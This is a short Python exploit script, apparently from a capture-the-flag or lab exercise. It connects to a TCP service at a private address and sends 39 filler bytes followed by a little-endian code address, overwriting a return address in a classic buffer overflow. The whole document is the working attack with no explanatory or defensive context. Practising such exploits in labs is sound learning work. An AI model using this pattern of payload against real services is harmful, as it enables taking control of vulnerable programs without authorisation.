import socket

ip = "10.9.8.1"
port = 5009

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))

response = client.recv(4096)
print(response.decode())

payload = "A" * 39 + "\x92\x11\x40\x00\x00\x00\x00\x00" + "\n"

client.send(payload.encode())

response = client.recv(4096)
print(response.decode())

client.close()
